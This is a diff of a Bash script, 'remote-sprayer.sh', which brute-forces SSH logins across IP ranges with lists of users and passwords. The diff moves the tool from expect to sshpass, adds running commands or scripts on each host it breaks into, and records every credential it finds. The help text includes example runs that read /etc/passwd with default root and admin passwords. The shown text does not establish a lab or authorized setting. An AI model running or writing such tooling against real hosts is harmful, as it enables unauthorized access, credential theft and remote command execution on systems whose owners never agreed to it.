@@ -1,4 +1,16 @@
 #!/usr/bin/env bash
+#
+# Automatically logs into the given targets using the given usernames and
+# passwords, running the provided commands.
+#
+# Known issues:
+#   local-troll.sh makes the SSH connection impossible because it's infinitely
+#   playing Rick Astley's "Never Gonna Give You Up" in the terminal upon login.
+#   FIXED, by unquoting the "bash -c" part of the command.
+#
+# To-Do:
+#   Option to save discovered credentials to a file
+#   Option to log SSH output to a file
 
 # *** Source library functions ***
 
@@ -10,8 +22,9 @@
 
 # *** Configuration variables ***
 
-DEFAULT_USER='zathras'
-DEFAULT_PASSWORD='password1!'
+#DEFAULT_COMMANDS="hostname && whoami && head -n 3 /etc/passwd"
+#DEFAULT_USER='zathras'
+#DEFAULT_PASSWORD='password1!'
 
 BANNER="${PURPLE}"' ____                      _            ____                                  
 |  _ \ ___ _ __ ___   ___ | |_ ___     / ___| _ __  _ __ __ _ _   _  ___ _ __ 
@@ -32,16 +45,97 @@ print_help() {
 	echo -e "${BOLD_WHITE}TARGET(S):${COLOR_OFF}"
 	echo -e "    ${BOLD_WHITE}<target>:${COLOR_OFF} A valid hostname, IP address, or IP address range that can be understood by Nmap"
 	echo -e "    ${BOLD_WHITE}-T|--targets <targets_file>:${COLOR_OFF} Path to a file containing targets, one target per line"
+	echo -e "${BOLD_WHITE}COMMANDS:${COLOR_OFF}"
+	echo -e "    ${BOLD_WHITE}<command>:${COLOR_OFF} The command to run on the target system if successfully authenticated via SSH" # ${BOLD_WHITE}(default: $DEFAULT_COMMANDS)${COLOR_OFF}
+	echo -e "    ${BOLD_WHITE}-C|--commands <commands_file>:${COLOR_OFF} Path to a file containing a Bash script to run on the target if successfully authenticated"
 	echo -e "${BOLD_WHITE}USER(S):${COLOR_OFF}"
-	echo -e "    ${BOLD_WHITE}-p|--password <password>:${COLOR_OFF} A password to authenticate with for each user logon attempt ${BOLD_WHITE}(default: $DEFAULT_PASSWORD)${COLOR_OFF}"
+	echo -e "    ${BOLD_WHITE}-p|--password <password>:${COLOR_OFF} A password to authenticate with for each user logon attempt"
 	echo -e "    ${BOLD_WHITE}-P|--passwords <passwords_file>:${COLOR_OFF} Path to a file containing passwords, one password per line"
 	echo -e "${BOLD_WHITE}PASSWORD(S):${COLOR_OFF}"
-	echo -e "    ${BOLD_WHITE}-u|--user <user>:${COLOR_OFF} A user to authenticate as on each target ${BOLD_WHITE}(default: $DEFAULT_USER)${COLOR_OFF}"
+	echo -e "    ${BOLD_WHITE}-u|--user <user>:${COLOR_OFF} A user to authenticate as on each target ${BOLD_WHITE}"
 	echo -e "    ${BOLD_WHITE}-U|--users <users_file>:${COLOR_OFF} Path to a file containing users, one user per line"
 	echo -e "${BOLD_WHITE}SWITCHES:${COLOR_OFF}"
 	echo -e "    ${BOLD_WHITE}-q|--quiet:${COLOR_OFF} Don't print the banner ASCII art"
 	echo -e "${BOLD_WHITE}HELP:${COLOR_OFF}"
 	echo -e "    ${BOLD_WHITE}-h|--help:${COLOR_OFF} Print this usage information"
+	echo
+	echo -e "${BOLD_WHITE}EXAMPLES:${COLOR_OFF}"
+	echo "    ./remote-sprayer.sh -u root -p toor 192.168.1.0-10 \"hostname && id\""
+	echo "    ./remote-sprayer.sh -u admin -p admin 192.168.1-8.65 \"cat /etc/passwd\""
+	echo "    ./remote-sprayer.sh -U ./users.txt -p 'password1!' myhostname \"hostname && id\""
+	echo "    ./remote-sprayer.sh -U ./users.txt -P ./passwords.txt -T ./targets.txt -C ./my_script.sh"
+}
+
+ssh_login() {
+	if [ $# -ne 3 ]; then
+		cecho error "ssh_login usage: ssh_login <user> <password> <target>"
+		return 1
+	fi
+
+	local user="$1"
+	local password="$2"
+	local target="$3"
+
+	local creds_format="$u:$p@$t"
+
+	cecho sep "-"
+
+	# Always save the stderr by redirecting it to stdout, just because I always want to see it
+	if [ ! -z "$command" ]; then # execute single command
+		ssh_output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 "$user"@"$target" bash -c "$command" 2>&1)
+	elif [ ! -z "$commands_file" ]; then # execute script
+		ssh_output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 "$user"@"$target" bash -s < "$commands_file" 2>&1)
+	fi
+
+	sshpass_exit_code=$?
+
+	echo "$ssh_output"
+
+	cecho sep "-"
+
+	# Check the exit status of the SSH login and command execution
+	case $sshpass_exit_code in
+		0)
+			cecho info "Valid credentials! => $creds_format"
+			return 0
+			;;
+		1)
+			cecho error "Invalid command line argument => $creds_format"
+			return 1
+			;;
+		2)
+			cecho error "Conflicting arguments => $creds_format"
+			return 1
+			;;
+		3)
+			cecho error "General runtime error => $creds_format"
+			return 1
+			;;
+		4)
+			cecho error "SSH parsing error => $creds_format"
+			return 1
+			;;
+		5)
+			cecho warning "Invalid password => $creds_format"
+			return 1
+			;;
+		255)
+			if grep -q "timed out" <<< "$ssh_output"; then
+				cecho error "SSH connection timed out, skipping target '$target'"
+				return 2
+			elif grep -q "not resolve" <<< "$ssh_output"; then
+				cecho error "Could not resolve hostname, skipping target '$target'"
+				return 3
+			else
+				cecho warning "Could not authenticate => $creds_format"
+				return 1
+			fi
+			;;
+		*)
+			cecho warning "Valid credentials, but command executed with errors => $creds_format"
+			return 0
+			;;
+	esac
 }
 
 
@@ -59,8 +153,8 @@ fi
 
 # "a"  = enable the flag (boolean, true)
 # "a:" = requires a value
-OPTIONS=T:u:U:p:P:qh
-LONGOPTS=targets:,user:,users:,password:,passwords:,quiet,help
+OPTIONS=T:C:u:U:p:P:qh
+LONGOPTS=targets:,commands:user:,users:,password:,passwords:,quiet,help
 
 # -temporarily store output to be able to check for errors
 # -activate quoting/enhanced mode (e.g. by writing out “--options”)
@@ -75,12 +169,12 @@ fi
 # read getopt’s output this way to handle the quoting right:
 eval set -- "$PARSED"
 
-# Command-line argument values
-target=""
+# Mandatory flag values
 target_file=""
-user="$DEFAULT_USER"
+commands_file=""
+user=""
 users_file=""
-password="$DEFAULT_PASSWORD"
+password=""
 passwords_file=""
 print_banner=true
 
@@ -93,6 +187,10 @@ while true; do
 #			;;
 		-T|--targets)
 			targets_file="$2"
+			shift 2
+			;;
+		-C|--commands)
+			commands_file="$2"
 			shift 2
 			;;
 		-u|--user)
@@ -130,12 +228,25 @@ while true; do
 	esac
 done
 
-# Handle non-option arguments (starts at $1 like normal)
-target="$1"
+# Handle mandatory non-flag arguments (starts at $1 like normal)
+# There could be two, one, or no arguments, depending on the flags used
+if [ -z "$targets_file" ]; then
+	target="$1"
+	if [ -z "$commands_file" ]; then
+		command="$2"
+	fi
+elif [ -z "$commands_file" ]; then
+	command="$1"
+fi
 
 # Ensure all mandatory arguments are provided
 if [ -z "$target" ] && [ -z "$targets_file" ]; then
 	cecho error "Must provide a target or targets file"
+	invalid_usage=true
+fi
+
+if [ -z "$command" ] && [ -z "$commands_file" ]; then
+	cecho error "Must provide a command or commands file"
 	invalid_usage=true
 fi
 
@@ -164,8 +275,11 @@ target_list=""
 user_list=""
 password_list=""
 
+# 'test -n "$thing"' was giving me issues later in this script, so I just
+# replaced all occurrences with 'test ! -z "$thing"' to be safe
+
 # If single target
-if [ -n "$target" ]; then
+if [ ! -z "$target" ]; then 
 	target_list=$(expand_ips "$target")
 	if [ $? -ne 0 ]; then
 		cecho error "Nmap is unable to parse '$target' as a valid target or target range"
@@ -188,7 +302,7 @@ else # At this point, must be a targets file
 fi
 
 # If single user
-if [ -n "$user" ]; then
+if [ ! -z "$user" ]; then
 	user_list="$user"
 else # At this point, must be a users file
 	# Check if file exists
@@ -207,7 +321,7 @@ else # At this point, must be a users file
 fi
 
 # If single password
-if [ -n "$password" ]; then
+if [ ! -z "$password" ]; then
 	password_list="$password"
 else # At this point, must be a passwords file
 	# Check if file exists
@@ -230,130 +344,183 @@ fi
 
 cecho task "Attempting Logins"
 
-# Ensure 'expect' is present
-if ! exists expect; then
-	cecho error "'expect' not found, exiting"
+### Expect was glitchy, used sshpass instead
+## Ensure 'expect' is present
+#if ! exists expect; then
+# cecho error "'expect' not found, exiting"
+#	exit 1
+#fi
+
+if ! exists sshpass; then
+  cecho error "'sshpass' required but not found, exiting"
 	exit 1
 fi
 
-commands="hostname; whoami; head -n 2 /etc/passwd"
+# Hold all discovered credentials per target
+declare -A all_credentials
 
 # Iterate over ever possible login
-for t in $target_list; do
-	for u in $user_list; do
-		for p in $password_list; do
+while read -r t; do
 
-			cecho log "$u:$p @ $t"
-			cecho sep "-"
+	skip_target=false
 
-			creds_format="$u : $p @ [$t]"
-			successful_login=false
+	# To clear an associative array, you must 'unset' then re-declare it
+	declare -A target_credentials
 
-			# Below expect code assisted by:
-			# - https://linuxaria.com/howto/2-practical-examples-of-expect-on-the-linux-cli
-			# - https://serverfault.com/questions/241588/how-to-automate-ssh-login-with-password
+	while read -r u; do
 
-			# --- Automatic SSH login and command execution using expect
-			# Don't save expect commands to our .bash_history since it would expose
-			# credentials
-			export HISTIGNORE="expect*"
-			# Read `man expect` to learn more; there's a lot of detail
+		# If we can't connect to the SSH server on the target, no point in trying
+		# to keep connecting to it.
+		if [ $skip_target = true ]; then
+			break
+		fi
 
-			# expect has weird issues for SSH when ran on CentOS systems like no
-			# command results being printed to stdout. Replace with 'sshpass' or
-			# 'runoverssh' instead? Look into alternatives.
-			expect <<- EOD
-				# The value of timeout must be an integral number of seconds.
-				# Normally timeouts are nonnegative, but the special case of -1
-				# signifies that expect #should wait forever.
-				set timeout 15
+		successful_login=false
 
-				# Don't print send/expect dialogue to stdout
-				#log_user 0
+		### Cache only checks user at current target, which we wouldn't need to
+		### test any more, so it's kinda pointless.
+		## Cache for optimization
+		#if [ ! -z "${target_credentials["${u}"]}" ]; then
+		#	echo
+		#	cecho info "Trying known credentials - $u:$p"
+		#	ssh_login "$u" "${target_credentials["${u}"]}" "$t" "$commands"
 
-				# Now we can connect to the remote server/port with our username and
-				# password. The command spawn is used to execute another process:
-				spawn -noecho ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 $u@$t "$commands"
+		#	if [ $? -eq 0 ]; then
+		#		successful_login=true
+		#	fi
+		#fi
 
-				# Now we expect to have a request for password:
-				expect {
-					"?assword:" { # Valid host
-						# At this point we want to see stdout
-						#log_user 1
+		while read -r p; do
 
-						# And we send our password:
-						send -- "$p\r"
+			echo
+			cecho log "Brute forcing login: $u:$p@$t"
+			### Expect was glitchy, used sshpass instead
+			## Below expect code assisted by:
+			## - https://linuxaria.com/howto/2-practical-examples-of-expect-on-the-linux-cli
+			## - https://serverfault.com/questions/241588/how-to-automate-ssh-login-with-password
 
-						# Check for invalid password
-						expect_background "?ermission denied" {
-							exit 1
-						}
+			## --- Automatic SSH login and command execution using expect
+			## Don't save expect commands to our .bash_history since it would expose
+			## credentials
+			#export HISTIGNORE="expect*"
+			## Read `man expect` to learn more; there's a lot of detail
 
-						# send blank line (\r) to make sure we get back to cli
-						send -- "\r"
+			## expect has weird issues for SSH when ran on CentOS systems like no
+			## command results being printed to stdout. Replace with 'sshpass' or
+			## 'runoverssh' instead? Look into alternatives.
+			#expect <<- EOD
+				## The value of timeout must be an integral number of seconds.
+				## Normally timeouts are nonnegative, but the special case of -1
+				## signifies that expect #should wait forever.
+				#set timeout 15
 
-						# No need to 'exit' the SSH session. We've already exited our
-						# commands, so the server will close the connection for us.
+				## Don't print send/expect dialogue to stdout
+				##log_user 0
 
-						# In this block we can specify any final actions to carry out,
-						# though we don't want to in this case:
-						# (Note: It also seems like CentOS boxes don't trigger an EOF when
-						#        the session is closed? They also still print out the
-						#        password prompt to stdout, necessitating the earlier
-						#        'log_user 0' statement.)
-						#expect eof
-					} "?ermission denied" {
-						exit 2
-					} "*timed out" {
-						exit 3
-					} "unreachable" { # Invalid host
-						exit 4
-					} "not resolve hostname" { # Invalid host
-						exit 5
-					}
-				}
-			EOD
+				## Now we can connect to the remote server/port with our username and
+				## password. The command spawn is used to execute another process:
+				#spawn -noecho ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 $u@$t "$commands"
 
-			expect_exit_code=$?
+				## Now we expect to have a request for password:
+				#expect {
+				#	"?assword:" { # Valid host
+				#		# At this point we want to see stdout
+				#		#log_user 1
 
-			cecho sep "-"
+				#		# And we send our password:
+				#		send -- "$p\r"
 
-			# Check the exit status of the SSH login and command execution
-			case $expect_exit_code in
-				0)
-					cecho info "Valid credentials! $creds_format"
-					successful_login=true
-					;;
-				1)
-					cecho warning "Invalid credentials: $creds_format"
-					;;
-				2)
-					cecho warning "Password authentication disabled: [$t]"
-					;;
-				3)
-					cecho warning "Connection timed out: [$t]"
-					;;
-				4)
-					cecho warning "Unreachable host: [$t]"
-					;;
-				5)
-					cecho warning "Could not resolve target: [$t]"
-					;;
-				*)
-					cecho error "Unrecognized exit code, programming error: $creds_format"
-					;;
-			esac
+				#		# Check for invalid password
+				#		expect_background "?ermission denied" {
+				#			exit 1
+				#		}
 
-			# Reset HISTIGNORE
-			export HISTIGNORE=""
+				#		# send blank line (\r) to make sure we get back to cli
+				#		send -- "\r"
 
-			test $successful_login = true && break
+				#		# No need to 'exit' the SSH session. We've already exited our
+				#		# commands, so the server will close the connection for us.
 
+				#		# In this block we can specify any final actions to carry out,
+				#		# though we don't want to in this case:
+				#		# (Note: It also seems like CentOS boxes don't trigger an EOF when
+				#		#        the session is closed? They also still print out the
+				#		#        password prompt to stdout, necessitating the earlier
+				#		#        'log_user 0' statement.)
+				#		#expect eof
+				#	} "?ermission denied" {
+				#		exit 2
+				#	} "*timed out" {
+				#		exit 3
+				#	} "unreachable" { # Invalid host
+				#		exit 4
+				#	} "not resolve hostname" { # Invalid host
+				#		exit 5
+				#	}
+				#}
+			#EOD
+
+			#expect_exit_code=$?
+
+			## Reset HISTIGNORE
+			#export HISTIGNORE=""
+
+			ssh_login "$u" "$p" "$t"
+
+			ssh_login_status=$?
+
+			# Store valid credentials and break from for loop, no need to try more
+			# passwords
+			if [ $ssh_login_status -eq 0 ]; then
+				successful_login=true
+				target_credentials["$u"]="$u:$p"
+				break
+			elif [ $ssh_login_status -eq 2 ]; then
+				skip_target=true	
+				target_credentials["Timed out"]="timed_out"
+				break
+			elif [ $ssh_login_status -eq 3 ]; then
+				skip_target=true	
+				target_credentials["Unknown host"]="unknown_host"
+				break
+			fi
+
+		done <<< "$password_list"
+
+		if [ $successful_login = false ]; then
+			cecho warning "--- No credentials found - $u@$t"
+		fi
+	done <<< "$user_list"
+
+	all_credentials["$t"]="${target_credentials[@]}"
+	unset target_credentials # clear the associative array for the next iteration
+
+done <<< "$target_list"
+
+echo
+cecho done "Done Login Attempts"
+
+cecho task "Printing All Discovered Credentials"
+echo
+for target in ${!all_credentials[@]}; do
+	cecho log "Credentials for $target:"
+	if [ ! -z "${all_credentials["$target"]}" ]; then
+		for creds in ${all_credentials["$target"]}; do
+			if [ "$creds" = "timed_out" ]; then
+				cecho error "Timed out"
+			elif [ "$creds" = "unknown_host" ]; then
+				cecho error "Could not resolve hostname"
+			else
+				cecho info "$creds"
+			fi
 		done
-	done
+	else
+		cecho warning "None"
+	fi
 done
 
-cecho done "Done!"
+echo
+cecho done "--- Done! ---"
 
 
 #echo "target: '$target', targets_file: '$targets_file', user: '$user', users_file: '$users_file', password: '$password', passwords_file: '$passwords_file', in: '$1'"
